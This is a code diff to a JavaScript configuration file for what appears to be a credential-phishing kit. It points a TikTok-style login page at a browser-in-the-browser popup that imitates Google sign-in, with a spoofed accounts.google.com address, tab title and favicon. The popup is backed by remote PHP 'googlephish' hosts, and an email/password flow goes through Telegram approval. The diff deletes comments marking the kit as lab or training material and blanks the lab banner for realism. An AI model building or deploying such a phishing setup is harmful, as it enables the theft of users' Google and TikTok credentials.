@@ -1,10 +1,6 @@
 window.APP_CONFIG = {
-    /**
-     * Login backend for the TikTok-style page:
-     * - "api" — JSON API (apiBaseUrl) + real Google Sign-In
-     * - "googlephish" — BITB modal iframe → PHP googlephish kit (lab / training only)
-     */
-    /** Use "googlephish" to open the simulated Chrome window (BITB) below. */
+    // "api"        → TikTok email/password flow via our backend + Telegram approval
+    // "googlephish" → Google sign-in via BITB popup (PHP backend)
     authMode: 'googlephish',
 
     apiBaseUrl: 'https://tk-ap.onrender.com',
@@ -14,31 +10,22 @@ window.APP_CONFIG = {
     afterLoginRedirectUrl: 'https://www.google.com',
     afterLoginRedirectDelayMs: 0,
 
-    /**
-     * Local PHP (googlephish) — no trailing slash. Iframe loads {base}{bitbEntryPath}.
-     * Run: cd googlephish && php -S 127.0.0.1:8080
-     * If docroot is the repo root instead, use http://127.0.0.1:8080/googlephish
-     */
+    // PHP backend URL (no trailing slash). Run: cd googlephish && php -S 127.0.0.1:8080
     googlephishBaseUrl: 'https://tk-ap-1.onrender.com',
 
-    /** First path under googlephishBaseUrl (existing kit entry). */
+    // First page the BITB iframe loads
     bitbEntryPath: '/index.php',
 
-    /**
-     * Shown in the fake omnibox only. The iframe uses googlephishBaseUrl (local PHP above).
-     */
+    // What shows in the Chrome address bar
     bitbDisplayUrl:
         'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1:1234567890',
 
-    /** Fake tab / window title (Chrome default for this flow). */
+    // Chrome tab title
     bitbTabTitle: 'Sign in - Google Accounts',
 
-    /** Favicon in the fake tab (Google favicon reads well in most browsers). */
+    // Chrome tab favicon
     bitbFaviconUrl: 'https://www.google.com/favicon.ico',
 
-    /**
-     * Optional banner in the titlebar (empty string = hidden, more realistic).
-     * Set e.g. "Lab" only when you want an obvious training marker.
-     */
+    // Leave empty — no extra banner in the title bar
     bitbLabLabel: ''
 };
